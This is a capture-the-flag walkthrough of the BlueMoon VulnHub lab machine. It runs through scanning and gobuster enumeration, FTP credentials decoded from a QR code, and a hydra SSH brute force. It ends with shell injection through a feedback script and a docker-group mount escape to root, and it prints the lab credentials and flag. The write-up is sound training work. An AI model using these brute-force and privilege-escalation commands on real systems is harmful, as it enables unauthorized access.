# Vulnerable-Machine-BlueMoon

# BlueMoon 2021 VulnHub Walkthrough

## 📌 Objectives
- Identify target machine
- Enumerate open services
- Gain initial access
- Escalate privileges to root

## Lab Setting Up
- Attacker: Kali Linux
- Attacker IP: 192.168.56.102
- Victim: Bluemoon
- Victim IP: 192.168.56.104

## Step 1 — Discover Attacker IP

I used ifconfig to know the attacker’s IP.

```bash
ifconfig

```
## Step 2 — Discover Target IP

Next, identify the target machine on the network.

```bash
sudo netdiscover
```
Looking for a new IP that is not attacker machine.

Example result:

192.168.56.104 → target machine

## Step 3 — Port Scanning

I run a full scan to identify open ports and services.

```bash
nmap -sC -sV -Pn -vv 192.168.56.104

```
Example Findings:
- Port 22 → SSH
- Port 21 → FTP
- Port 80 → HTTP (Web Server)

## Step 4 — Web Enumeration

I used gobuster to perform brute-forcing command to discover hidden paths on a web server.

```bash
gobuster dir --url http://ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 -x .txt

```
These are the directories that has been succesfully identified.

- /service-status
- /hidden_text
- Accessing the root URL at http://192.168.56.104/hidden_text that led to a maintenance notice which stating, "Maintenance!Sorry For Delay.We will recover soon. Thank You ...
- There is something off with the Thank You and after clicking it, I discovered a QR code.
- Decoding the QR code revealed a FTP credentials for user and password.

```bash
user : userftp
password : ftpp@ssword
```

## Step 5 — FTP Access
# Connecting to FTP

Attempted coonect to the FTP service on the target machine:

```bash
ftp 192.168.56.104
```

# Enumerating Files
Once inside the FTP server, I listed the available files:

```
ls
```

The following files were found:

```
information.txt
p_lists.txt
```
 These files looked interesting and potentially contained useful information such as credentials or hints.

 # Downloading Files
I downloaded both files to my local machine:

```
get information.txt
get p_lists.txt
```
The transfer completed successfully.

# Exiting FTP

```
exit
```
Read the contents of the files:
```
cat information.txt
cat p_lists.txt
```

# SSH Brute Force (Hydra)
After obtaining a potential password list (p_lists.txt) from the FTP server, I used Hydra to perform a brute force attack on the SSH service.
```
hydra -l robin -P p_lists.txt 192.168.56.104 ssh
```

# Result
```
[22][ssh] host: 192.168.56.104   login: robin   password: k4vr3ndh4nh4ck3r
```
This confirms that:

Username: robin
Password: k4vr3ndh4nh4ck3r

# Gaining Initial Access
Using the discovered credentials, I logged into the target machine via SSH:
```
ssh robin@192.168.56.104
sudo -u jerry ./feedback.sh
```

# Executing ./feedback.sh
During the enumeration phase, a script named feedback.sh was discovered. This script appears to collect user input and execute a shell.

# Running the script
To execute the script:
```
./feedback.sh
```
# Interaction
The script prompts for user input:

Enter Your Name: 
Enter You FeedBack About This Target Machine:

Example:

Enter Your Name: Imelia 
Enter You FeedBack About This Target Machine: /bin/bash

The script executes a shell, giving access to the system.

```
whoami
```
It shown that the user is:
jerry

# User Information 
```
id
```
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)

# Checking Available Docer Images
```
docker images
```
```
REPOSITORY   TAG     IMAGE ID       CREATED        SIZE
alpine       latest  28f6e2705743   5 years ago    5.61MB
```

# Exploiting Docker for Root Access
I used Docker to mount the host filesystem and spawn a root shell:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

# Root Access Achieved
```
whoami
```
```
root
```

# Capturing Root Flag
Navigate to root directory:
```
cd /root
ls
```
```
root.txt
```
Read the flag:
```
cat root.txt
```

Congratulations You Reached Root...! Root-Flag FLAG{r00t-H4ckTh3Pl4n3t0nc34g41n}
